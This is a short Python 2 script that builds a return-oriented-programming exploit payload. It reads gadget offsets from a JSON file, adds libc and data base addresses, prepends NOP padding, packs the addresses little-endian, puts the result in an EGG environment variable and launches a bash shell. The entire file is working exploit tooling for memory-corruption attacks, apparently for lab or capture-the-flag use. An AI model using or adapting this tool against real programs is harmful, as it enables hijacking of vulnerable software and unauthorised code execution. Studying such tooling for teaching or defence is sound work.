import os
import sys
import json
import pprint
import subprocess

class GenerateROPShellcode(object):
    """
    @params
    id: The id of the ROP code that needs to be converted to shellcode
    json_file: JSON file 
    """
    def __init__(self, padding, _id, json_file):
        self._id = _id
        self.padding = padding
        self.json_file = json_file
        self.libc_base = 0x0
        self.data_base = 0x0
        self.code = ''
        self.addresses = []
        self.shellcode = ''

        self.pp = pprint.PrettyPrinter(indent=4)

    def get_code(self):
        with open(self.json_file) as json_file:
            json_data = json.load(json_file)
            for k, v in json_data.iteritems():
                for values in v:
                    if values['id'] is self._id:
                        self.code = values['code']
                        self.libc_base = hex(int(values['libc_base'].replace('L', ''), 16))
                        self.data_base = hex(int(values['data_base'].replace('L', ''), 16))
        self.construct_shellcode()

    def construct_shellcode(self):
        commands = self.code.split('\n')
        for command in commands:
        	tokens = command.split(':')
        	if tokens[0].strip() == "ROP command":
        		self.addresses.append(hex(int(self.libc_base.replace('L', ''), 16) + int(tokens[1].replace('L', ''), 16)))
        	elif tokens[0].strip() == "Address":
        		self.addresses.append(hex(int(self.data_base.replace('L', ''), 16) + int(tokens[1].replace('L', ''), 16)))
        	else:
        		self.addresses.append(hex(int(tokens[1].replace('L', ''), 16)))

        for i in range(0, self.padding):
        	self.shellcode += '90'.decode('hex')

        for address in self.addresses:
        	self.shellcode += (address[2:].replace('L', '').zfill(8).decode('hex'))[::-1]

        os.putenv('EGG', self.shellcode)
        subprocess.call('/bin/bash', shell=True)


def main():
    if len(sys.argv) < 4:
        print 'Padding, ID of rop code and json file required required.\n'
    else:
        generator = GenerateROPShellcode(padding=int(sys.argv[1]),_id=int(sys.argv[2]), json_file=sys.argv[3])
        generator.get_code()

if __name__ == '__main__':
    main()